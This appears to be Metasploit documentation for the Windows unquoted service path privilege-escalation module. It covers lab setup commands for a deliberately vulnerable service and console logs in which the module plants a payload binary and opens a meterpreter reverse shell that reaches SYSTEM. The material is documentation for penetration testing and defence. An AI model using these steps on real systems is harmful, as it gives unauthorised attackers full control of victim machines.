## Vulnerable Application

Commonly known as Trusted Service Path, or Unquoted Service path, this exploits a behavior of windows service.
When a service calls an executable, a full path is given.  If the full path contains a space,
Windows will attempt to execute a file up to the space, with `.exe` appended.
If the executable isn't found, it keeps going until the full path or the next space (and repeat).

@sumitvgithub had an excellent write-up on this
[here](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

As is documented in that write-up, if the executable is C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe

Windows will attempt to run the following, in order.

  1.  C:\Program.exe
  2.  C:\Program Files\A.exe
  3.  C:\Program Files\A Subfolder\B.exe
  4.  C:\Program Files\A Subfolder\B Subfolder\C.exe
  5.  C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe

To exploit this, we simply need to go in reverse order to see if we're able to write a payload to those locations.
In Win7+ the deeper folders are more likely to succeed based on default Windows permissions for users.

Then, a service restart is required.  Often a user won't be able to do this,
so the payload is left on disk as a reboot or service restart will trigger the payload to launch.

The service will fail to start as long as the payload remains on disk.  Manual cleanup of the payload
is required.

### Creating a Vulnerable Service

This is sourced from @sumitvgithub's write-up
[here](https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae)

With an administrator command prompt, execute the following:

```
sc create "Some Vulnerable Service" binpath= "C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe" Displayname= "Vuln Service DP" start= auto
mkdir "C:\Program Files\A Subfolder\B Subfolder\C Subfolder"
icacls "C:\Program Files\A Subfolder" /grant "BUILTIN\Users":W
```

This creates a vulnerable service, with `A Subfolder` being vulnerable to user writes.

## Verification Steps

  1. Start msfconsole
  2. Get a user shell
  3. Do: ```use exploits/windows/local/unquoted_service_path```
  4. Do: ```set session #```
  5. Do: ```run```
  6. You should either get a shell, or need to start a `multi/handler` and have the target restarted.

## Options

### QUICK

If only the first service should attempt to be exploited, or all of them (sequentially).  Default is `true`

## Scenarios

### Windows 10 (16299) with Service Listed Above


```
[*] Using exploit/windows/local/unquoted_service_path
resource (unquoted.rb)> setg verbose true
verbose => true
resource (unquoted.rb)> set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
resource (unquoted.rb)> setg lhost 1.1.1.1
lhost => 1.1.1.1
resource (unquoted.rb)> setg lport 4444
lport => 4444
resource (unquoted.rb)> set session 1
session => 1
msf5 exploit(windows/local/unquoted_service_path) > 
[*] Sending stage (180291 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.1:8888 -> 2.2.2.2:49696) at 2020-04-10 14:41:32 -0400

msf5 exploit(windows/local/unquoted_service_path) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : MSEDGEWIN10
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: MSEDGEWIN10\IEUser
meterpreter > background
[*] Backgrounding session 1...
msf5 exploit(windows/local/unquoted_service_path) > run

[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Finding a vulnerable service...
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[-] Request Error extapi_service_query: Operation failed: Access is denied. falling back to registry technique
[+] Found vulnerable service: Some Vulnerable Service - C:\Program Files\A Subfolder\B Subfolder\C Subfolder\SomeExecutable.exe (LocalSystem)
[*] Attempting exploitation of Some Vulnerable Service
[*] Enumerating vulnerable paths
[*] Checking writability to: C:\Program Files\A Subfolder\B Subfolder
[-] Path not writable
[*] Checking writability to: C:\Program Files\A Subfolder
[+] Path is writable
[*] Placing C:\Program Files\A Subfolder\B.exe for Some Vulnerable Service
[*] Attempting to write 15872 bytes to C:\Program Files\A Subfolder\B.exe...
[+] Manual cleanup of C:\Program Files\A Subfolder\B.exe is required due to a potential reboot for exploitation.
[+] Successfully wrote payload
[*] Launching service Some Vulnerable Service...
[*] Manual cleanup of the payload file is required. Some Vulnerable Service will fail to start as long as the payload remains on disk.
[-] [Some Vulnerable Service] Unhandled error: Could not open service. OpenServiceA error: FormatMessage failed to retrieve the error.
[-] Unable to restart service.  System reboot or an admin restarting the service is required.  Payload left on disk!!!
[*] Exploit completed, but no session was created.
```

Manually start a handler, and restart the service (via GUI) to launch the exploit

```
msf5 exploit(windows/local/unquoted_service_path) > handler -p windows/meterpreter/reverse_tcp -H 1.1.1.1 -P 4444
[*] Payload handler running as background job 1.

[*] Started reverse TCP handler on 1.1.1.1:4444 
msf5 exploit(windows/local/unquoted_service_path) > [*] Sending stage (180291 bytes) to 2.2.2.2
[*] Meterpreter session 2 opened (1.1.1.1:4444 -> 2.2.2.2:49708) at 2020-04-10 14:43:26 -0400

msf5 exploit(windows/local/unquoted_service_path) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > sysinfo
Computer        : MSEDGEWIN10
OS              : Windows 10 (10.0 Build 16299).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

The most important part!!!

```
meterpreter > rm "C:\\Program Files\\A Subfolder\\B.exe"

```
